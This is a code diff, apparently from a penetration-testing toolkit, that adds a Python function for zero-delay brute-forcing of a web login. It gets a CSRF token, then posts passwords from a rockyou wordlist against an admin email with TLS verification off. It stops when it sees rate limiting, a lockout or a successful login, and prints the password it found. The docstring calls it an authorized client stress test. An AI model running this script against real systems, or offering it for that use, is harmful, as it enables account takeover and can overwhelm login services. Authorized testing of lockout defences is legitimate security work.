@@ -203,3 +203,174 @@ if __name__ == "__main__":
         max_minutes=60,
         output_dir="engagements/[CLIENT]/findings/bruteforce"
     )
+
+def brute_force_nodlay(
+    target="https://target.example.com",
+    email="admin@target.example.com",
+    password_file=None,
+    max_minutes=10,
+    output_dir=None
+):
+    """Zero delay brute force — client authorized stress test"""
+    from datetime import datetime, timedelta
+    import requests, time
+    from pathlib import Path
+    from rich.console import Console
+    from rich.panel import Panel
+
+    console = Console()
+    start_time = datetime.now()
+    deadline = start_time + timedelta(minutes=max_minutes)
+
+    console.print(Panel(
+        f"[bold red]⬡ ZERO DELAY STRESS TEST[/bold red]\n"
+        f"[dim]Target  : {target}/login[/dim]\n"
+        f"[dim]Email   : {email}[/dim]\n"
+        f"[dim]Delay   : 0ms (maximum speed)[/dim]\n"
+        f"[dim]Duration: {max_minutes} minutes[/dim]",
+        border_style="red"
+    ))
+
+    session = requests.Session()
+    attempt = 0
+    errors = 0
+    status_counts = {}
+    lockout_at = None
+    rate_limit_at = None
+    peak_rate = 0
+
+    # Get CSRF token
+    try:
+        r = session.get(f"{target}/app/login", verify=False, timeout=10)
+        xsrf = session.cookies.get("XSRF-TOKEN")
+        csrf = __import__('urllib.parse', fromlist=['unquote']).unquote(xsrf) if xsrf else ""
+    except:
+        csrf = ""
+
+    minute_start = datetime.now()
+    minute_count = 0
+
+    with open(password_file, encoding="utf-8", errors="ignore") as f:
+        for password in f:
+            password = password.strip()
+            if not password:
+                continue
+
+            if datetime.now() > deadline:
+                console.print(f"\n[yellow]⏱ {max_minutes} min time limit reached[/yellow]")
+                break
+
+            attempt += 1
+            minute_count += 1
+
+            # Calculate rate per minute
+            elapsed_sec = (datetime.now() - minute_start).seconds
+            if elapsed_sec >= 60:
+                current_rate = minute_count
+                if current_rate > peak_rate:
+                    peak_rate = current_rate
+                minute_count = 0
+                minute_start = datetime.now()
+
+            headers = {
+                "Content-Type": "application/json",
+                "Accept": "application/json",
+                "X-XSRF-TOKEN": csrf,
+                "Referer": f"{target}/app/login",
+                "Origin": target,
+            }
+
+            try:
+                r = session.post(
+                    f"{target}/login",
+                    json={"email": email, "password": password},
+                    headers=headers,
+                    verify=False,
+                    timeout=10,
+                    allow_redirects=False
+                )
+                status = r.status_code
+                status_counts[status] = status_counts.get(status, 0) + 1
+
+                # Detect rate limiting
+                if status == 429:
+                    rate_limit_at = attempt
+                    console.print(f"\n[bold green]⬡ RATE LIMIT at attempt {attempt:,}![/bold green]")
+                    console.print(f"[green]  Server defended after {attempt} attempts[/green]")
+                    break
+
+                # Detect lockout
+                if any(x in r.text.lower() for x in ["too many", "locked", "blocked", "throttle", "captcha"]):
+                    lockout_at = attempt
+                    console.print(f"\n[bold green]⬡ SOFT BLOCK at attempt {attempt:,}![/bold green]")
+                    break
+
+                # Success
+                if status == 200 and "dashboard" in r.text.lower():
+                    console.print(f"\n[bold red]⬡ LOGIN SUCCESS![/bold red]")
+                    console.print(f"  Password: {password}")
+                    break
+
+                # Progress every 500
+                if attempt % 500 == 0:
+                    elapsed = (datetime.now() - start_time).seconds
+                    rate = attempt / max(elapsed, 1) * 60
+                    console.print(
+                        f"  [dim]Attempt {attempt:,} | "
+                        f"Status: {status} | "
+                        f"Rate: {rate:.0f}/min | "
+                        f"Elapsed: {elapsed//60}m{elapsed%60}s[/dim]"
+                    )
+
+            except Exception as e:
+                errors += 1
+                if errors % 50 == 0:
+                    console.print(f"[dim red]  Errors: {errors}[/dim red]")
+                    session = requests.Session()
+                continue
+
+            # ZERO DELAY — no sleep
+
+    elapsed_total = (datetime.now() - start_time).seconds
+    rate_avg = attempt / max(elapsed_total, 1) * 60
+
+    console.print(f"\n[bold]⬡ ZERO DELAY STRESS TEST COMPLETE[/bold]")
+    console.print(f"  Total attempts : [bold]{attempt:,}[/bold]")
+    console.print(f"  Duration       : {elapsed_total//60}m {elapsed_total%60}s")
+    console.print(f"  Average rate   : [bold]{rate_avg:.0f} attempts/min[/bold]")
+    console.print(f"  Peak rate      : [bold]{peak_rate}/min[/bold]")
+    console.print(f"  Errors         : {errors}")
+    console.print(f"  Status codes   : {status_counts}")
+    console.print(f"  Rate limit     : {rate_limit_at or 'NEVER TRIGGERED ⚠️'}")
+    console.print(f"  Lockout        : {lockout_at or 'NEVER TRIGGERED ⚠️'}")
+
+    if output_dir:
+        out = Path(output_dir)
+        out.mkdir(parents=True, exist_ok=True)
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        report = out / f"zero_delay_{ts}.md"
+        report.write_text(
+            f"# Zero Delay Stress Test\n"
+            f"- Target: {target}/login\n"
+            f"- Email: {email}\n"
+            f"- Attempts: {attempt:,}\n"
+            f"- Duration: {elapsed_total//60}m {elapsed_total%60}s\n"
+            f"- Avg Rate: {rate_avg:.0f}/min\n"
+            f"- Peak Rate: {peak_rate}/min\n"
+            f"- Statuses: {status_counts}\n"
+            f"- Rate limit: {rate_limit_at or 'NEVER'}\n"
+            f"- Lockout: {lockout_at or 'NEVER'}\n"
+        )
+        console.print(f"[dim]Report: {report}[/dim]")
+
+
+if __name__ == "__main__":
+    import warnings
+    warnings.filterwarnings("ignore")
+    brute_force_nodlay(
+        target="https://target.example.com",
+        email="admin@target.example.com",
+        password_file="wordlists/rockyou_3m.txt",
+        max_minutes=10,
+        output_dir="engagements/[CLIENT]/findings/bruteforce"
+    )
